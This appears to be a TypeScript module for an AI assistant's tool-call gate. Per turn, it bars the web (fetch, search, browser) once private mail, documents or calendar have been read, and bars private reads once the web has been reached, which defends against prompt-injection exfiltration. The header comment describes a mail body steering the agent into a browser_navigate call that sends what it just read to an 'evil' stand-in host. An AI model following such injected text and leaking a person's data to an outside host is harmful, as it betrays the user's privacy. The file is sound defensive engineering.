import { CONNECTOR_CALL, CONNECTOR_MATCHER } from "./assistant-connectors.js";

/**
 * What a turn has already touched, and what that costs it.
 *
 * The chair holds both halves of an exfiltration: it reads the mail, the
 * documents and the calendar, and it drives a browser that can open any URL.
 * A mail body that talks it into `browser_navigate("https://evil/?q=<what it
 * just read>")` needs no click and leaves no trace on this bench. The written
 * safety model said "agents that read stranger text cannot fetch, run or send",
 * and the browser arrived after it.
 *
 * Rather than taking the browser away — which is a capability the chair is
 * genuinely useful for — a turn may hold either half, not both. Reading
 * something of the person's closes the browser and bars it for the rest of
 * that turn, whichever order the two came in: after the read there is nothing
 * to carry anything out with, and a turn that browsed first is in the same
 * place the moment it reads.
 *
 * Per turn, because that is the unit a prompt injection acts within: the next
 * turn starts clean, and the person browsing the pane themselves is not a turn
 * at all.
 */

/** Turn ids that have read something private. Bounded: turn ids are per CLI run. */
const readPrivate = new Set<string>();

/**
 * Turn ids that have reached the web: a page fetched, a search, a browser
 * opened.
 *
 * The browser can be taken away again, because it is a process this backend
 * owns. WebFetch and WebSearch cannot — they are on the CLI's command line, and
 * that is fixed when the turn is spawned — so for those the rule has to run the
 * other way round: a turn that has already fetched something does not get to
 * read anything of the person's afterwards. Either way a turn holds one half.
 */
const usedWeb = new Set<string>();

/** A few turns' worth of each. Turn ids are per CLI run, so this is generous. */
const MAX_REMEMBERED = 64;

function remember(set: Set<string>, turn: string): void {
  set.add(turn);
  // Oldest first, which is insertion order for a Set.
  for (const old of set) {
    if (set.size <= MAX_REMEMBERED) break;
    set.delete(old);
  }
}

export function barBrowsing(turn: string): void {
  remember(readPrivate, turn);
}

export function browsingBarred(turn: string | undefined): boolean {
  return turn !== undefined && readPrivate.has(turn);
}

/** The built-in web tools, which a turn cannot be relieved of once it has them. */
const WEB_TOOLS = new Set(["WebFetch", "WebSearch"]);

/** Called as the stream reports each tool the turn asks for. */
export function noteTool(turn: string, name: string): void {
  if (WEB_TOOLS.has(name) || name.startsWith("mcp__browser")) remember(usedWeb, turn);
}

/**
 * A turn that has read something private can only have tried: the gate refused
 * the call. The stream notes a tool as it is written, before the gate has ruled,
 * and a refused fetch must not cost the turn its next read as well.
 */
export function reachedTheWeb(turn: string | undefined): boolean {
  return turn !== undefined && usedWeb.has(turn) && !readPrivate.has(turn);
}

const WEB_CALL = /^(WebFetch$|WebSearch$|mcp__browser__)/;

/** What the PreToolUse hook matches on: every call the gate has an opinion about. */
export const GATED_TOOLS = `WebFetch|WebSearch|mcp__browser__.*|${CONNECTOR_MATCHER}`;

export type GateRuling = { allow: true; closeBrowser: boolean } | { allow: false; reason: string };

/**
 * Rule on one tool call before it runs, and record it in the same step, so two
 * calls made at once cannot both find the turn clean. This is what holds the
 * rule for the tools this backend cannot take back: the stream only ever saw
 * them after they had been asked for, and nothing stopped them.
 */
export function ruleOnCall(turn: string, tool: string): GateRuling {
  if (WEB_CALL.test(tool)) {
    if (readPrivate.has(turn)) {
      return {
        allow: false,
        reason:
          "This turn has read something private, so it cannot reach the web. Answer from what you have, and do the web part in a separate turn.",
      };
    }
    remember(usedWeb, turn);
    return { allow: true, closeBrowser: false };
  }
  if (CONNECTOR_CALL.test(tool)) {
    if (reachedTheWeb(turn)) {
      return {
        allow: false,
        reason:
          "This turn has reached the web, so it cannot read anything private. Do the two in separate turns.",
      };
    }
    remember(readPrivate, turn);
    return { allow: true, closeBrowser: true };
  }
  // Only reachable if the matcher and these patterns part ways, and a call
  // nobody has ruled on is not one to wave through.
  return { allow: false, reason: `No rule covers ${tool}.` };
}

/** Test seam: module state, and a test file is one process. */
export function resetTaint(): void {
  readPrivate.clear();
  usedWeb.clear();
}
